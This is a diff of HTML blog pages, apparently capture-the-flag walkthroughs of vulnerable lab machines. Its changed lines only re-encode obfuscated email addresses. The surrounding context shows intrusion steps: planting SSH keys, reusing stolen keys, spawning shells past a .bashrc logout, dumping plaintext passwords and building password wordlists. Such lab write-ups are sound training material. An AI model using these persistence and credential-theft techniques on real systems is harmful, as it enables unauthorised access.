 <p>However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x64;&#x65;&#108;&#97;&#x63;&#x72;&#111;&#105;&#x78;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#48;&#x2e;&#49;&#x30;&#50;">&#100;&#x65;&#x6c;&#97;&#x63;&#x72;&#x6f;&#105;&#120;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x30;&#46;&#x31;&#48;&#x32;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x64;&#x65;&#x6c;&#97;&#99;&#x72;&#111;&#105;&#120;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x30;&#x2e;&#x31;&#x30;&#x32;">&#100;&#x65;&#x6c;&#97;&#99;&#114;&#111;&#x69;&#120;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#48;&#46;&#49;&#x30;&#50;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -4194,7 +4323,7 @@ $[/plain]</p>
 
 <p>Say hello to <a href="http://shodan.wikia.com/wiki/Janice_Polito">Janice Polito</a>, she&rsquo;s got a smirk on her hasn&rsquo;t she ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x70;&#111;&#108;&#105;&#x74;&#x6f;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#49;&#48;&#x32;">&#112;&#x6f;&#108;&#x69;&#x74;&#x6f;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#48;&#x32;</a></p>
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x70;&#x6f;&#x6c;&#105;&#116;&#x6f;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#48;&#x32;">&#112;&#111;&#108;&#105;&#116;&#x6f;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#46;&#x31;&#x30;&#x32;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -4742,7 +4871,7 @@ korenchkin@xerxes2:~$ .32.1
 ]0;korenchkin@xerxes2: ~
 korenchkin@xerxes2:~$
 ts/0korenchkin
-2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x72;&#111;&#111;&#x74;&#64;&#x78;&#x65;&#x72;&#x78;&#101;&#115;&#x32;&#x2e;&#116;&#114;&#105;&#x6f;&#112;&#116;&#x69;&#109;&#117;&#x6d;">&#x72;&#111;&#111;&#116;&#x40;&#x78;&#101;&#x72;&#120;&#x65;&#x73;&#x32;&#x2e;&#116;&#114;&#x69;&#x6f;&#x70;&#x74;&#105;&#109;&#x75;&#x6d;</a> R=local_user T=mail_spool
+2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x72;&#x6f;&#x6f;&#116;&#x40;&#x78;&#101;&#114;&#120;&#x65;&#115;&#x32;&#46;&#116;&#x72;&#105;&#111;&#112;&#116;&#x69;&#109;&#117;&#x6d;">&#114;&#111;&#111;&#x74;&#64;&#120;&#x65;&#x72;&#x78;&#x65;&#115;&#x32;&#46;&#x74;&#x72;&#105;&#x6f;&#112;&#x74;&#x69;&#109;&#x75;&#109;</a> R=local_user T=mail_spool
 ]0;korenchkin@x
 korenchkin
 korenchkin
@@ -4885,7 +5014,7 @@ polito@xerxes2:~/korenchkin$
 <p>Looks like Korenchkin is sensible and backs up his keypair&hellip; but now I have it, so user impersonation is possible.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#107;&#111;&#x72;&#101;&#110;&#99;&#x68;&#x6b;&#x69;&#x6e;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#46;&#x31;">&#x6b;&#111;&#x72;&#101;&#x6e;&#99;&#x68;&#x6b;&#105;&#x6e;&#64;&#49;&#x32;&#55;&#46;&#48;&#46;&#x30;&#x2e;&#49;</a>
+polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#107;&#111;&#x72;&#101;&#110;&#x63;&#104;&#x6b;&#105;&#x6e;&#64;&#49;&#50;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#107;&#x6f;&#114;&#101;&#x6e;&#x63;&#104;&#x6b;&#105;&#x6e;&#64;&#49;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#x2e;&#x31;</a>
 The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -5157,7 +5286,7 @@ korenchkin@xerxes2:~/a$ /tmp/rootshell</p>
 <p>Well, what do you know - a binary owned by root with the SUID attribute set that drops us to a root shell. I&rsquo;ll echo my SSH key into authorized_keys for completeness, and SSH in as root and cat the /root/flag.txt file</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x72;&#111;&#111;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#49;&#x30;&#x32;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#x31;&#x30;&#x32;</a></p>
+root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#50;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x30;&#x2e;&#x31;&#48;&#x32;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -5303,12 +5432,12 @@ tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      
 <p>Let us SSH into it with the provided credentials</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#106;&#111;&#104;&#110;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#46;&#48;&#46;&#x31;">&#x6a;&#111;&#104;&#110;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#46;&#49;</a> -p 222
+root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x6a;&#x6f;&#104;&#x6e;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#106;&#x6f;&#x68;&#x6e;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#46;&#x30;&#x2e;&#49;</a> -p 222
 The authenticity of host &lsquo;[127.0.0.1]:222 ([127.0.0.1]:222)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
 Are you sure you want to continue connecting (yes/no)? yes
 Warning: Permanently added &lsquo;[127.0.0.1]:222&rsquo; (ECDSA) to the list of known hosts.
-<a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#106;&#x6f;&#104;&#110;&#64;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#48;&#46;&#x31;">&#x6a;&#111;&#x68;&#x6e;&#x40;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;</a>&rsquo;s password:
+<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#106;&#111;&#x68;&#110;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;">&#106;&#111;&#x68;&#110;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#x31;</a>&rsquo;s password:
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -5325,8 +5454,8 @@ root@pwk:~#[/plain]</p>
 
 <p>Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#111;&#104;&#x6e;&#64;&#x31;&#50;&#55;&#x2e;&#x30;&#x2e;&#x30;&#46;&#49;">&#x6a;&#x6f;&#x68;&#x6e;&#64;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
-<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#106;&#x6f;&#x68;&#110;&#64;&#49;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#106;&#111;&#104;&#110;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;</a>&rsquo;s password: hereisjohn
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#x6a;&#111;&#x68;&#x6e;&#x40;&#x31;&#x32;&#55;&#46;&#x30;&#46;&#48;&#46;&#49;">&#x6a;&#x6f;&#x68;&#110;&#x40;&#x31;&#x32;&#55;&#46;&#x30;&#46;&#x30;&#46;&#x31;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
+<a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6a;&#111;&#104;&#x6e;&#64;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#x6a;&#111;&#x68;&#x6e;&#64;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#x31;</a>&rsquo;s password: hereisjohn
 john@SkyTower:~$[/plain]</p>
 
 <p>First things first, that SQLi filter - what did it look like in it&rsquo;s entirety ?</p>
@@ -5373,9 +5502,9 @@ mysql> show tables;
 +&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
 | id | email               | password     |
 +&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
-|  1 | <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#106;&#x6f;&#104;&#110;&#64;&#x73;&#x6b;&#121;&#x74;&#x65;&#99;&#x68;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#111;&#104;&#110;&#64;&#x73;&#107;&#x79;&#x74;&#x65;&#x63;&#x68;&#46;&#x63;&#x6f;&#109;</a>    | hereisjohn   |
-|  2 | <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#115;&#x61;&#114;&#x61;&#64;&#115;&#x6b;&#x79;&#x74;&#101;&#99;&#x68;&#46;&#x63;&#111;&#109;">&#115;&#x61;&#x72;&#x61;&#x40;&#115;&#107;&#121;&#x74;&#101;&#99;&#x68;&#x2e;&#99;&#111;&#x6d;</a>    | ihatethisjob |
-|  3 | <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#119;&#105;&#x6c;&#108;&#x69;&#97;&#109;&#x40;&#115;&#x6b;&#121;&#x74;&#101;&#99;&#x68;&#46;&#x63;&#111;&#x6d;">&#x77;&#x69;&#x6c;&#x6c;&#x69;&#97;&#x6d;&#64;&#x73;&#107;&#121;&#116;&#x65;&#x63;&#x68;&#x2e;&#99;&#x6f;&#x6d;</a> | senseable    |
+|  1 | <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x6a;&#111;&#x68;&#x6e;&#64;&#x73;&#x6b;&#x79;&#116;&#x65;&#99;&#104;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#111;&#x68;&#x6e;&#64;&#115;&#x6b;&#x79;&#116;&#101;&#x63;&#104;&#x2e;&#x63;&#111;&#109;</a>    | hereisjohn   |
+|  2 | <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#115;&#97;&#x72;&#97;&#64;&#x73;&#x6b;&#x79;&#116;&#101;&#x63;&#x68;&#46;&#x63;&#x6f;&#x6d;">&#x73;&#x61;&#114;&#97;&#x40;&#x73;&#107;&#x79;&#x74;&#x65;&#x63;&#104;&#x2e;&#99;&#x6f;&#x6d;</a>    | ihatethisjob |
+|  3 | <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#119;&#x69;&#x6c;&#x6c;&#x69;&#97;&#109;&#64;&#115;&#107;&#121;&#116;&#x65;&#x63;&#104;&#46;&#99;&#x6f;&#109;">&#x77;&#105;&#108;&#108;&#x69;&#x61;&#x6d;&#64;&#115;&#x6b;&#x79;&#116;&#x65;&#99;&#104;&#x2e;&#x63;&#111;&#x6d;</a> | senseable    |
 +&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
 3 rows in set (0.00 sec)</p>
 
@@ -5402,8 +5531,8 @@ john@SkyTower:~$
 <p>We&rsquo;re hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#115;&#x61;&#x72;&#97;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x73;&#x61;&#x72;&#97;&#64;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#46;&#49;</a> -p 222 -t /bin/sh
-<a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x73;&#97;&#x72;&#97;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;">&#x73;&#x61;&#114;&#x61;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#x31;</a>&rsquo;s password: ihatethisjob
+root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#115;&#x61;&#x72;&#x61;&#x40;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#49;">&#115;&#97;&#x72;&#x61;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;</a> -p 222 -t /bin/sh
+<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#115;&#97;&#114;&#x61;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;">&#x73;&#97;&#114;&#x61;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;</a>&rsquo;s password: ihatethisjob
 $[/plain]</p>
 
 <p><img src="http://i.imgur.com/PbksBXu.gif" alt="" /></p>
@@ -5557,8 +5686,8 @@ No password or keyfile specified.[/plain]</p>
 <p>Looking around a bit more, it looks like George has also signed up for RockYou</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-From: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#114;&#x6f;&#x63;&#107;&#x79;&#x6f;&#x75;&#x2e;&#x63;&#111;&#x6d;">&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#114;&#111;&#x63;&#x6b;&#121;&#111;&#x75;&#46;&#x63;&#x6f;&#x6d;</a>
-To: <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x73;&#x75;&#112;&#x65;&#114;&#95;&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#x68;&#101;&#x6c;&#108;&#x2e;&#99;&#111;&#109;">&#115;&#x75;&#x70;&#x65;&#114;&#95;&#97;&#x64;&#109;&#105;&#110;&#x40;&#104;&#101;&#108;&#108;&#46;&#x63;&#111;&#109;</a>
+From: <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x61;&#x64;&#109;&#x69;&#110;&#64;&#x72;&#x6f;&#99;&#107;&#121;&#x6f;&#x75;&#46;&#x63;&#x6f;&#109;">&#x61;&#100;&#109;&#105;&#110;&#64;&#x72;&#x6f;&#99;&#107;&#121;&#111;&#x75;&#x2e;&#x63;&#111;&#x6d;</a>
+To: <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#115;&#x75;&#x70;&#x65;&#114;&#95;&#x61;&#100;&#109;&#x69;&#110;&#64;&#x68;&#x65;&#108;&#108;&#46;&#99;&#111;&#x6d;">&#x73;&#x75;&#112;&#x65;&#x72;&#95;&#97;&#x64;&#109;&#105;&#x6e;&#x40;&#x68;&#101;&#108;&#x6c;&#46;&#x63;&#x6f;&#109;</a>
 Subject: Account Activation
 Date: 13th November 2009</p>
 
@@ -5605,7 +5734,7 @@ george@hell:~/tc$ [/plain]</p>
 <p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~/tc$ ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x62;&#x61;&#x7a;&#x7a;&#x61;&#x40;&#x31;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#46;&#49;">&#98;&#97;&#122;&#x7a;&#x61;&#64;&#49;&#x32;&#55;&#46;&#48;&#46;&#48;&#46;&#x31;</a> -i ./id_rsa
+george@hell:~/tc$ ssh <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x62;&#x61;&#122;&#x7a;&#x61;&#x40;&#x31;&#50;&#x37;&#x2e;&#48;&#46;&#48;&#46;&#49;">&#x62;&#x61;&#122;&#x7a;&#x61;&#x40;&#49;&#50;&#x37;&#x2e;&#48;&#46;&#48;&#46;&#x31;</a> -i ./id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -6031,7 +6160,7 @@ $
 $ gpg &ndash;import .pgp/pgp.priv
 gpg: key 3F18AB0A: secret key imported
 gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
-gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#97;&#x63;&#107;&#64;&#99;&#111;&#x77;&#108;&#111;&#118;&#x65;&#x72;&#x73;&#46;&#99;&#111;&#109;">&#x6a;&#97;&#99;&#x6b;&#64;&#x63;&#x6f;&#x77;&#108;&#x6f;&#118;&#x65;&#x72;&#115;&#46;&#99;&#111;&#109;</a>&rdquo; imported
+gpg: key 3F18AB0A: public key &ldquo;<a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#106;&#x61;&#x63;&#107;&#64;&#99;&#x6f;&#x77;&#108;&#111;&#118;&#x65;&#114;&#115;&#46;&#x63;&#111;&#x6d;">&#106;&#x61;&#x63;&#107;&#x40;&#99;&#x6f;&#119;&#x6c;&#111;&#118;&#101;&#114;&#115;&#46;&#99;&#x6f;&#109;</a>&rdquo; imported
 gpg: Total number processed: 1
 gpg:               imported: 1  (RSA: 1)
 gpg:       secret keys read: 1
@@ -6039,14 +6168,14 @@ gpg:   secret keys imported: 1
 $ gpg -o email.txt /var/mail/jack/received/message.eml</p>
 
 <p>You need a passphrase to unlock the secret key for
-user: &ldquo;<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x61;&#99;&#107;&#x40;&#99;&#111;&#x77;&#108;&#x6f;&#x76;&#101;&#114;&#115;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#x61;&#x63;&#x6b;&#x40;&#x63;&#111;&#119;&#x6c;&#x6f;&#x76;&#101;&#x72;&#115;&#x2e;&#x63;&#111;&#109;</a>&rdquo;</p>
+user: &ldquo;<a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x6a;&#97;&#x63;&#107;&#x40;&#x63;&#x6f;&#119;&#108;&#x6f;&#x76;&#101;&#114;&#115;&#46;&#99;&#111;&#109;">&#x6a;&#97;&#99;&#x6b;&#x40;&#x63;&#x6f;&#119;&#108;&#111;&#x76;&#101;&#x72;&#115;&#x2e;&#x63;&#x6f;&#109;</a>&rdquo;</p>
 
 <p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>
 
 <p>Enter passphrase: g0tmi1k69
 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
-      &ldquo;<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#106;&#97;&#99;&#x6b;&#x40;&#x63;&#111;&#119;&#x6c;&#111;&#x76;&#101;&#114;&#115;&#x2e;&#x63;&#x6f;&#109;">&#106;&#x61;&#x63;&#x6b;&#64;&#99;&#111;&#119;&#108;&#111;&#118;&#x65;&#114;&#115;&#x2e;&#99;&#x6f;&#109;</a>&rdquo;
+      &ldquo;<a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x6a;&#97;&#99;&#107;&#64;&#x63;&#x6f;&#119;&#x6c;&#111;&#118;&#101;&#x72;&#115;&#x2e;&#x63;&#x6f;&#x6d;">&#x6a;&#x61;&#99;&#107;&#64;&#99;&#111;&#119;&#x6c;&#111;&#x76;&#x65;&#114;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo;
 gpg: WARNING: message was not integrity protected
 $ cat email.txt
 Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>
@@ -6138,7 +6267,7 @@ MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
 <p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
-CeWL 5.0 Robin Wood (<a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x72;&#x6f;&#x62;&#x69;&#x6e;&#64;&#100;&#105;&#x67;&#x69;&#110;&#x69;&#x6e;&#106;&#x61;&#46;&#x6f;&#114;&#103;">&#x72;&#111;&#98;&#x69;&#x6e;&#64;&#x64;&#105;&#103;&#105;&#110;&#x69;&#x6e;&#x6a;&#97;&#46;&#x6f;&#114;&#103;</a>) (www.digininja.org)</p>
+CeWL 5.0 Robin Wood (<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#114;&#111;&#98;&#x69;&#110;&#x40;&#100;&#x69;&#103;&#x69;&#x6e;&#105;&#x6e;&#106;&#x61;&#x2e;&#x6f;&#114;&#x67;">&#114;&#x6f;&#x62;&#105;&#x6e;&#x40;&#x64;&#x69;&#103;&#x69;&#x6e;&#x69;&#x6e;&#x6a;&#x61;&#46;&#111;&#114;&#103;</a>) (www.digininja.org)</p>
 
 <p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
 Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
@@ -6313,7 +6442,7 @@ MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
 <p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
-CeWL 5.0 Robin Wood (<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#114;&#111;&#x62;&#105;&#x6e;&#64;&#100;&#105;&#103;&#105;&#110;&#105;&#x6e;&#106;&#97;&#46;&#111;&#x72;&#103;">&#114;&#x6f;&#x62;&#x69;&#110;&#x40;&#x64;&#105;&#x67;&#105;&#x6e;&#105;&#x6e;&#106;&#x61;&#x2e;&#x6f;&#x72;&#103;</a>) (www.digininja.org)</p>
+CeWL 5.0 Robin Wood (<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x72;&#111;&#98;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#105;&#x6e;&#105;&#110;&#x6a;&#97;&#x2e;&#x6f;&#x72;&#x67;">&#x72;&#111;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#x67;&#x69;&#x6e;&#x69;&#110;&#x6a;&#97;&#46;&#111;&#x72;&#103;</a>) (www.digininja.org)</p>
 
 <p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
 Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
@@ -6517,7 +6646,7 @@ $
 $ gpg &ndash;import .pgp/pgp.priv
 gpg: key 3F18AB0A: secret key imported
 gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
-gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#106;&#97;&#99;&#x6b;&#64;&#x63;&#x6f;&#119;&#108;&#x6f;&#x76;&#x65;&#x72;&#115;&#x2e;&#x63;&#111;&#109;">&#x6a;&#97;&#99;&#107;&#x40;&#99;&#111;&#x77;&#108;&#111;&#x76;&#101;&#114;&#x73;&#46;&#x63;&#x6f;&#109;</a>&rdquo; imported
+gpg: key 3F18AB0A: public key &ldquo;<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#106;&#x61;&#x63;&#x6b;&#64;&#99;&#x6f;&#x77;&#x6c;&#111;&#x76;&#x65;&#114;&#115;&#x2e;&#x63;&#111;&#x6d;">&#106;&#97;&#x63;&#x6b;&#x40;&#x63;&#111;&#119;&#x6c;&#x6f;&#118;&#x65;&#x72;&#x73;&#46;&#99;&#111;&#x6d;</a>&rdquo; imported
 gpg: Total number processed: 1
 gpg:               imported: 1  (RSA: 1)
 gpg:       secret keys read: 1
@@ -6525,14 +6654,14 @@ gpg:   secret keys imported: 1
 $ gpg -o email.txt /var/mail/jack/received/message.eml</p>
 
 <p>You need a passphrase to unlock the secret key for
-user: &ldquo;<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#x61;&#99;&#107;&#64;&#x63;&#x6f;&#119;&#x6c;&#x6f;&#x76;&#x65;&#114;&#115;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#x61;&#x63;&#107;&#64;&#99;&#111;&#119;&#108;&#111;&#x76;&#101;&#x72;&#115;&#x2e;&#x63;&#111;&#x6d;</a>&rdquo;</p>
+user: &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#106;&#97;&#99;&#x6b;&#64;&#x63;&#111;&#119;&#x6c;&#x6f;&#x76;&#101;&#x72;&#x73;&#46;&#99;&#111;&#x6d;">&#x6a;&#x61;&#99;&#x6b;&#x40;&#x63;&#x6f;&#x77;&#x6c;&#x6f;&#118;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;</a>&rdquo;</p>
 
 <p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>
 
 <p>Enter passphrase: g0tmi1k69
 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
-      &ldquo;<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#x61;&#99;&#x6b;&#x40;&#x63;&#111;&#119;&#x6c;&#111;&#118;&#x65;&#114;&#115;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#97;&#x63;&#x6b;&#64;&#99;&#x6f;&#119;&#108;&#x6f;&#x76;&#x65;&#x72;&#115;&#46;&#x63;&#x6f;&#x6d;</a>&rdquo;
